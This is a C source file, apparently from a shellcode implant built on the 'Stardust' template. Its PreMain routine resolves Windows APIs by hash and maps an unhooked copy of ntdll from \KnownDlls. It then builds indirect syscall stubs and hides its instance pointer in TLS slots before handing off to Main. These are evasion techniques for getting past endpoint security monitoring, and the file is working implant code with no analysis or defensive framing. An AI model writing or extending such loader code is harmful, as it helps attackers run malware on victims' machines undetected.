#include "Common.h"
#include "Constexpr.h"
#include "Dbg.h"

#define TLS_SEARCH_LIMIT  20

//
// Map a fresh copy of ntdll.dll from \KnownDlls\ntdll.dll.
// Uses the in-process ntdll exports (pre-syscall) because we need the clean
// copy before we can build indirect syscall stubs.
//
FUNC PVOID NaxMapCleanNtdll(
    _In_ PINSTANCE Inst ) {

    NTSTATUS status = 0;
    HANDLE   hSection = NULL;
    PVOID    base = NULL;
    SIZE_T   viewSize = 0;
    ULONG    old = 0;

    UNICODE_STRING usName = { 0 };
    usName.Buffer = NAX_KNOWN_DLLS_NTDLL_W;
    usName.Length = (USHORT)(sizeof(NAX_KNOWN_DLLS_NTDLL_W) - sizeof(WCHAR));
    usName.MaximumLength = usName.Length + sizeof(WCHAR);

    OBJECT_ATTRIBUTES oa = { 0 };
    InitializeObjectAttributes(&oa, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // NtOpenSection
    status = Inst->Win32.NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa);
    if ( !NT_SUCCESS(status) || !hSection )
        return NULL;

    // NtMapViewOfSection
    status = Inst->Win32.NtMapViewOfSection(
        hSection, NtCurrentProcess(), &base, 0, 0, NULL,
        &viewSize, 1, 0, PAGE_EXECUTE_READ);

    Inst->Win32.NtClose(hSection);

    if ( !NT_SUCCESS(status) || !base )
        return NULL;

    return base;
}

EXTERN_C FUNC VOID PreMain(
    _In_ PVOID Param ) {

    INSTANCE Stardust = { 0 };
    PVOID    Heap     = NtCurrentPeb()->ProcessHeap;
    PVOID    Inst     = NULL;

    MmZero(&Stardust, sizeof(Stardust));

    Stardust.Base.Buffer = StRipStart();
    Stardust.Base.Length = (ULONG)(U_PTR(StRipEnd()) - U_PTR(Stardust.Base.Buffer));

    //
    // Stage 1: resolve the bare minimum from the in-process PEB so we can map
    // a clean ntdll and build indirect syscalls.  kernel32 comes first so the
    // debug ladder can print as early as possible.
    //
    if ( !(Stardust.Modules.Kernel32 = LdrModulePeb(H_MODULE_KERNEL32)) )
        return;

    NAXDBG(Stardust.Modules.Kernel32, "\r\np0k32\r\n");

    if ( !(Stardust.Modules.Ntdll = LdrModulePeb(H_MODULE_NTDLL)) ) {
        NAXDBG(Stardust.Modules.Kernel32, "p1-ntdll-FAIL\r\n");
        return;
    }

    Stardust.Win32.RtlAllocateHeap = LdrFunction(Stardust.Modules.Ntdll, HASH_STR("RtlAllocateHeap"));
    Stardust.Win32.NtOpenSection = LdrFunction(Stardust.Modules.Ntdll, HASH_STR("NtOpenSection"));
    Stardust.Win32.NtMapViewOfSection = LdrFunction(Stardust.Modules.Ntdll, HASH_STR("NtMapViewOfSection"));
    Stardust.Win32.NtUnmapViewOfSection = LdrFunction(Stardust.Modules.Ntdll, HASH_STR("NtUnmapViewOfSection"));
    Stardust.Win32.NtProtectVirtualMemory = LdrFunction(Stardust.Modules.Ntdll, HASH_STR("NtProtectVirtualMemory"));
    Stardust.Win32.NtClose = LdrFunction(Stardust.Modules.Ntdll, HASH_STR("NtClose"));

    Stardust.Win32.VirtualAlloc = LdrFunction(Stardust.Modules.Kernel32, HASH_STR("VirtualAlloc"));
    Stardust.Win32.TlsAlloc = LdrFunction(Stardust.Modules.Kernel32, HASH_STR("TlsAlloc"));
    Stardust.Win32.TlsSetValue = LdrFunction(Stardust.Modules.Kernel32, HASH_STR("TlsSetValue"));
    Stardust.Win32.TlsFree = LdrFunction(Stardust.Modules.Kernel32, HASH_STR("TlsFree"));

    NAXDBG(Stardust.Modules.Kernel32, "p1-apis\r\n");
    if ( !Stardust.Win32.RtlAllocateHeap || !Stardust.Win32.VirtualAlloc || !Stardust.Win32.TlsAlloc ||
         !Stardust.Win32.TlsSetValue || !Stardust.Win32.TlsFree ||
         !Stardust.Win32.NtOpenSection || !Stardust.Win32.NtMapViewOfSection ) {
        NAXDBG(Stardust.Modules.Kernel32, "p1-apis-FAIL\r\n");
        return;
    }

    //
    // Stage 2: heap-allocate INSTANCE and map clean ntdll.
    //
    NAXDBG(Stardust.Modules.Kernel32, "p2-heap\r\n");
    Inst = Stardust.Win32.RtlAllocateHeap(Heap, HEAP_ZERO_MEMORY, sizeof(INSTANCE));
    NAXDBGX(Stardust.Modules.Kernel32, "p2-heap=", Inst);
    if ( !Inst ) {
        NAXDBG(Stardust.Modules.Kernel32, "p2-heap-FAIL\r\n");
        return;
    }

    MmCopy(Inst, &Stardust, sizeof(INSTANCE));

    PINSTANCE pInst = (PINSTANCE)Inst;

    NAXDBG(Stardust.Modules.Kernel32, "p3-cleanmap\r\n");
    pInst->Modules.CleanNtdll = NaxMapCleanNtdll(pInst);
    if ( !pInst->Modules.CleanNtdll ) {
        NAXDBG(Stardust.Modules.Kernel32, "p3-cleanmap-FAIL\r\n");
        return;
    }

    //
    // Stage 3: build indirect syscall stubs from the clean copy.
    //
    NAXDBG(Stardust.Modules.Kernel32, "p4-scinit\r\n");
    if ( !NaxScInit(pInst) ) {
        NAXDBG(Stardust.Modules.Kernel32, "p4-scinit-FAIL\r\n");
        return;
    }

    //
    // Stage 4: TLS egghunter — consecutive slots for INSTANCE retrieval.
    //
    NAXDBG(Stardust.Modules.Kernel32, "p5-tls\r\n");
    DWORD  slots[TLS_SEARCH_LIMIT] = { 0 };
    UINT32 slotCount = 0;
    DWORD  eggSlot = TLS_OUT_OF_INDEXES;
    DWORD  instSlot = TLS_OUT_OF_INDEXES;

    for ( UINT32 i = 0; i < TLS_SEARCH_LIMIT; i++ ) {
        slots[i] = pInst->Win32.TlsAlloc();
        if ( slots[i] == TLS_OUT_OF_INDEXES )
            break;
        slotCount++;

        if ( i > 0 && slots[i] == slots[i - 1] + 1 ) {
            eggSlot = slots[i - 1];
            instSlot = slots[i];
            break;
        }
    }

    if ( eggSlot == TLS_OUT_OF_INDEXES ) {
        NAXDBG(Stardust.Modules.Kernel32, "p5-tls-FAIL\r\n");
        return;
    }

    for ( UINT32 i = 0; i < slotCount; i++ ) {
        if ( slots[i] != eggSlot && slots[i] != instSlot )
            pInst->Win32.TlsFree(slots[i]);
    }

    pInst->Win32.TlsSetValue(eggSlot, (LPVOID)NtCurrentPeb());
    pInst->Win32.TlsSetValue(instSlot, Inst);

    MmZero(&Stardust, sizeof(Stardust));

    NAXDBG(Stardust.Modules.Kernel32, "p6-main\r\n");
    Main(Param);
    NAXDBG(Stardust.Modules.Kernel32, "p7-main-ret\r\n");
}
